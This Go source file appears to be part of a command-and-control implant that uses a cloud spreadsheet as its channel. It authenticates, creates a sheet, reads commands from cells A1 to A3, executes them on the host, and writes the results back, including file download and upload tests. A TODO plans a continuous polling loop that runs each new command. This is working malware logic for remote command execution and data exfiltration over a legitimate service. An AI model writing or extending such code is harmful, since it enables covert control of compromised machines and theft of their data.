package C2

import "fmt"

func Run(c2 *Client) {

	// perform authentication
	c2.Authenticate()

	// new sheet meta
	newSheetName := c2.GenerateNewSheetName()
	c2.SheetName = newSheetName
	c2.Ticker = 10
	c2.TickerCell = "D1"
	c2.AddSheet(newSheetName)

	// tr := [][]string{{"Test", "Two"}}
	// _, err := c2.UpdateRange("A1:B1", tr)
	// if err != nil {
	// 	fmt.Println("Cell change error ", err)
	// }

	// TEST RUN CMD
	ex1, _ := c2.GetRangeValues("A1")
	var c1 string = ex1.Values[0][0].(string)
	test_cmd := new(Command)
	test_cmd.Input = c1
	test_cmd.Execute(*c2)
	_, err := c2.UpdateRange("B1", [][]string{{test_cmd.Output}})
	if err != nil {
		fmt.Println(err)
	}

	// TEST DOWNLOAD FILE
	ex2, _ := c2.GetRangeValues("A2")
	var cmd2 string = ex2.Values[0][0].(string)
	test_cmd2 := new(Command)
	test_cmd2.Input = cmd2
	test_cmd2.Execute(*c2)
	_, err = c2.UpdateRange("B2", [][]string{{test_cmd2.Output}})
	if err != nil {
		fmt.Println(err)
	}

	// TEST UPLOAD FILE
	ex3, _ := c2.GetRangeValues("A3")
	var cmd3 string = ex3.Values[0][0].(string)
	test_cmd3 := new(Command)
	test_cmd3.Input = cmd3
	test_cmd3.Execute(*c2)
	_, err = c2.UpdateRange("B3", [][]string{{test_cmd3.Output}})
	if err != nil {
		fmt.Println(err)
	}

	// TODO - cmd loop
	// * Use /usedRange API to get all the used cells
	// * Check for the ticker value and update it if changed
	// * Loop through the rows and if there is a value in A but not B, create a command and run it

}
